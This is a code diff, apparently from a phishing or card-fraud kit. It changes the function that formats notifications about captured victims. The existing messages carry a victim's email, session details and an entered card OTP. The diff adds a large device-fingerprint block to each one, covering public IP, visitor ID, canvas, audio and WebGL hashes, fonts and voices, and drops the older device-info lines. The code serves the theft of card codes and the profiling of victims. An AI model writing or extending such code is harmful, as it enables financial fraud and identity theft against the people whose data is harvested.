@@ -58,6 +58,45 @@ function getISTDateTime() {
   return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
 }
 
+function formatFingerprintBlock(fp) {
+  if (!fp) return '';
+  const nav = fp.navigator || {};
+  const scr = fp.screen   || {};
+  const wgl = fp.webgl    || {};
+  const fonts = Array.isArray(fp.fonts) ? fp.fonts.join(', ') : 'n/a';
+  const voices = Array.isArray(fp.voices) ? fp.voices.slice(0, 5).join(', ') : 'n/a';
+  const exts = Array.isArray(wgl.extensions) ? wgl.extensions.slice(0, 4).join(', ') : 'n/a';
+
+  return `\n\n📊 DEVICE FINGERPRINT
+🆔 Visitor ID: ${fp.visitorId || 'n/a'}
+🌍 Public IP: ${fp.ip || 'n/a'}
+
+🖥 Navigator
+  • UA: ${nav.userAgent || 'n/a'}
+  • Platform: ${nav.platform || 'n/a'}
+  • Language: ${nav.language || 'n/a'} [${nav.languages || ''}]
+  • Timezone: ${nav.timezone || 'n/a'}
+  • CPU cores: ${nav.hardwareConcurrency || 'n/a'} | RAM: ${nav.deviceMemory || 'n/a'} GB
+  • Touch points: ${nav.maxTouchPoints || '0'} | DNT: ${nav.doNotTrack || 'n/a'}
+
+📐 Screen
+  • Resolution: ${scr.width || '?'}×${scr.height || '?'} @ ${scr.pixelRatio || '?'}x
+  • Color depth: ${scr.colorDepth || '?'} bit
+
+🎨 Canvas hash: ${fp.canvas || 'n/a'}
+🔊 Audio hash: ${fp.audio || 'n/a'}
+🖼 WebGPU: ${fp.webgpu || 'n/a'}
+📐 ClientRects: ${fp.clientRects || 'n/a'}
+
+🎮 WebGL
+  • Renderer: ${wgl.renderer || 'n/a'}
+  • Vendor: ${wgl.vendor || 'n/a'}
+  • Extensions: ${exts}
+
+🔤 Fonts (${Array.isArray(fp.fonts) ? fp.fonts.length : 0}): ${fonts}
+🗣 Voices (${Array.isArray(fp.voices) ? fp.voices.length : 0}): ${voices}`;
+}
+
 function formatMessage(title, email, session, statusText, extraInfo = '') {
   let msg = `${title}\n\n`;
   msg += `📧 Email: ${email}\n`;
@@ -77,19 +116,17 @@ function formatMessage(title, email, session, statusText, extraInfo = '') {
   if (session.cardOtpEntered) {
     msg += `🔢 Card OTP: ${session.cardOtpEntered}\n`;
   }
-  if (session.deviceInfo) {
-    const di = session.deviceInfo;
-    msg += `📱 User-Agent: ${di.userAgent || 'unknown'}\n`;
-    msg += `🖥 Screen: ${di.screen || 'unknown'} | Platform: ${di.platform || 'unknown'}\n`;
-    msg += `🌐 Language: ${di.language || 'unknown'} | Timezone: ${di.timezone || 'unknown'}\n`;
-    msg += `🔑 Fingerprint: ${di.deviceFingerprint || 'unknown'}\n`;
-  }
   if (extraInfo) {
     msg += `${extraInfo}\n`;
   }
   const dateTimeStr = getISTDateTime();
   msg += `🕐 Time: ${dateTimeStr}\n`;
   msg += `Status: ${statusText}`;
+
+  if (session.fingerprint) {
+    msg += formatFingerprintBlock(session.fingerprint);
+  }
+
   return msg;
 }
 
